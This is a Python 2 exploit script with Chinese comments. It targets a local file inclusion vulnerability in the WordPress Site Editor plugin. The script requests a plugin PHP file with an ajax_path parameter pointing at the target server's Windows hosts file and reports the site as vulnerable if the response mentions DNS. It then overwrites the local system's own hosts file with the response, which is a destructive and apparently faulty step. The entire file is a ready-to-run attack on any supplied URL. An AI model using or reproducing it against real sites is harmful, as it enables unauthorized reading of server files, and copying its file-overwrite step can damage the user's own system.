#!/usr/bin/python
# -*- coding: utf-8 -*-
#漏洞连接https://www.exploit-db.com/exploits/44340/

import sys
import requests
reload(sys)
sys.setdefaultencoding('utf-8')
 
def POC(attack_url):
	    
        attack_req = requests.get(url=attack_url+"/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\Windows\System32\drivers\etc\hosts")
        
        if " DNS " in attack_req.text:   #判断是否存在漏洞
                print "漏洞存在"
        else:
                print "漏洞不存在"

        
        print(attack_req.text)    #打印网页


        r = attack_req             
        with open("C:\Windows\System32\drivers\etc\hosts",'wb') as f:     #下载host文件到本地
            f.write(r.content)



def main():

    args = sys.argv      #sys.argv[]是用来获取命令行参数的，sys.argv[0]表示代码本身文件路径，所以参数从1开始

    if len(args) == 2:
        url = args[1]

        POC(url)
    
    else:
            print "输入要测试的域名或ip：python http://www.xxxx.com"
           
            exit(0)   
    
if __name__ == '__main__':

    main()        